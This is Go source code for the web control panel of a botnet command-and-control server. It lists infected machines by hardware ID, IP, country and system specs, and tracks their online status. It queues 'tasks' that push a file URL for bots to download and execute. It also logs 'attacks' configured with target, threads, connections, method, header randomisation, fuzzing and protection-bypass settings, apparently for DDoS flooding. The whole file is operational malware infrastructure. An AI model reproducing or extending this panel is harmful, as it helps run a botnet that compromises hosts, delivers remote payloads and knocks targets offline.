package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"time"
)

type bot struct {
	HWID string
	IP string
	Country string
	CPU string
	RAM string
	OS string
	Status string
}

type task struct {
	Id int
	FileURL string
	Execution int
	CurrentExecution int
}

type attack struct {
	Id int
	AttackType string
	Target string
	Thread int
	Connection int
	Duration int
	Interval int
	Method string
	RandomHeader bool
	Fuzzer bool
	Protection int
	CookieDuration int
	Execution int
	CurrentExecution int
}

func subtractTime(time1, time2 time.Time) int{
	diff := time2.Sub(time1).Seconds()
	return int(diff)
}

func renderBots() ([]bot, int, int, int, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return nil, 0, 0, 0, err
	}
	defer db.Close()
	query := "SELECT * FROM bots"
	rows, _ := db.Query(query)
	var hwid, ip, country, cpu, ram, os, lastResponse string
	onlineCnt := 0
	offlineCnt := 0
	deadCnt := 0
	var botList []bot

	for rows.Next() {
		err := rows.Scan(&hwid, &ip, &country, &cpu, &ram, &os, &lastResponse)
		if err != nil {
			return nil, 0, 0, 0, err
		}
		lastResponseTime, err := time.Parse("2006-01-02 15:04:05", lastResponse)
		if err != nil {
			fmt.Println(err)
		}
		loc, _ := time.LoadLocation("UTC")
		currentTime := time.Now().In(loc)
		diffSecond := subtractTime(lastResponseTime, currentTime)
		var status string
		interval := getInterval()
		deadAfter := getDeadAfter()
		if err != nil {
			fmt.Println(err)
		}
		if diffSecond < interval * 60 + 10 {
			status = "Online"
			onlineCnt += 1
		} else if diffSecond > deadAfter * 86400 {
			status = "Dead"
			deadCnt += 1
		} else {
			status = "Offline"
			offlineCnt += 1
		}
		tempBot := bot{HWID: hwid, IP: ip, Country: country, CPU: cpu, RAM: ram, OS: os, Status: status}
		botList = append(botList, tempBot)
	}
	return botList, onlineCnt, offlineCnt, deadCnt, nil
}

func renderTask() ([]task, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	query := "SELECT * FROM task"
	rows, _ := db.Query(query)
	var fileUrl string
	var id, execution int
	var taskList []task

	for rows.Next() {
		err := rows.Scan(&id, &fileUrl, &execution)
		if err != nil {
			return nil, err
		}
		currentExecution := taskCompletedCount(id)
		tempTask := task{Id: id, FileURL: fileUrl, Execution: execution, CurrentExecution: currentExecution}
		taskList = append(taskList, tempTask)
	}
	return taskList, nil
}

func taskCompletedCount(id int) int {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT COUNT(*) FROM task_completed WHERE task_id=%d", id)
	rows := db.QueryRow(query)
	var count int
	err = rows.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func renderAttack() ([]attack, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	query := "SELECT * FROM attack"
	rows, _ := db.Query(query)
	var attackType, target, method string
	var id, thread, connection, duration, interval, protection, cookieDuration, execution int
	var randomHeader, fuzzer bool
	var attackList []attack

	for rows.Next() {
		err := rows.Scan(&id, &attackType, &target, &thread, &connection, &duration, &interval, &method, &randomHeader, &fuzzer, &protection, &cookieDuration, &execution)
		if err != nil {
			return nil, err
		}
		currentExecution := attackCompletedCount(id)
		tempAttack := attack{Id: id, AttackType: attackType, Target: target, Thread: thread, Connection: connection, Duration: duration, Interval: interval, Method: method, RandomHeader: randomHeader, Fuzzer: fuzzer, Protection: protection, CookieDuration: cookieDuration, Execution: execution, CurrentExecution: currentExecution}
		attackList = append(attackList, tempAttack)
	}
	return attackList, nil
}

func attackCompletedCount(id int) int {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT COUNT(*) FROM attack_completed WHERE attack_id=%d", id)
	rows := db.QueryRow(query)
	var count int
	err = rows.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func showDashboardPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	_, onlineCnt, offlineCnt, deadCnt, _ := renderBots()
	render(c, gin.H{
		"username": username,
		"onlineBot": onlineCnt,
		"deadBot": deadCnt,
		"offlineBot": offlineCnt,
	}, "dashboard.html")
}

func showAttackLogPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	attackList, _ := renderAttack()
	render(c, gin.H{
		"username": username,
		"payload": attackList,
	}, "attacklog.html")
}

func showNewAttackPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	render(c, gin.H{
		"username": username,
	}, "attacknew.html")
}

func showBotListPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	botList, _, _, _, _ := renderBots()
	render(c, gin.H{
		"username": username,
		"payload": botList,
	}, "botlist.html")
}

func showSettingPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	render(c, gin.H{
		"username": username,
		"interval": getInterval(),
		"deadAfter": getDeadAfter(),
	}, "setting.html")
}

func showTaskLogPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	taskList, _ := renderTask()
	render(c, gin.H{
		"username": username,
		"payload": taskList,
	}, "tasklog.html")
}

func showNewTaskPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if !valid {
			c.Redirect(302, "/login")
		}
	} else if username == nil || password == nil {
		c.Redirect(302, "/login")
	}
	render(c, gin.H{
		"username": username,
	}, "tasknew.html")
}

func show404Page(c *gin.Context) {
	render(c, gin.H{}, "404.html")
}

func showLoginPage(c *gin.Context) {
	session := sessions.Default(c)
	username := session.Get("username")
	password := session.Get("password")
	if username != nil && password != nil {
		valid := isUserValid(username.(string), password.(string))
		if valid {
			c.Redirect(302, "/dashboard")
		}
	}
	render(c, gin.H{}, "login.html")
}
